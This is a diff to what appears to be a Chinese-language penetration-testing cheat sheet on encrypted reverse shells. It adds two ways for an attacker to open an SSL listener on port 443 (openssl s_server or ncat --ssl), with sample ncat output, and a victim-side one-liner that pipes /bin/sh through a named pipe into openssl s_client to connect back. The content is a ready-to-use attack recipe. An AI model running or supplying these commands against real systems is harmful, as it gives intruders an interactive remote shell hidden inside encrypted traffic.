@@ -16,12 +16,24 @@
 
 ```shell
 # hacker
+# 开启监听 2个方法 任选其一:
+
+# 方法1
 hacker@kali$ openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes
 hacker@kali$ openssl s_server -quiet -key key.pem -cert cert.pem -port 443
-or
+
+# 方法2
 hacker@kali$ ncat --ssl -vv -l -p 443
 
+Ncat: Version 7.80 ( https://nmap.org/ncat )
+Ncat: Generating a temporary 2048-bit RSA key. Use --ssl-key and --ssl-cert to use a permanent one.
+Ncat: SHA-1 fingerprint: 1CDB C287 FA7E 0EB0 CBC9 3F8C 42C9 CA52 48DE 9484
+Ncat: Listening on :::443
+Ncat: Listening on 0.0.0.0:443
+```
 
+```
 # victim
+# victim主动外连
 user@company$ mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | openssl s_client -quiet -connect 127.0.0.1:443 > /tmp/s; rm /tmp/s
 ```
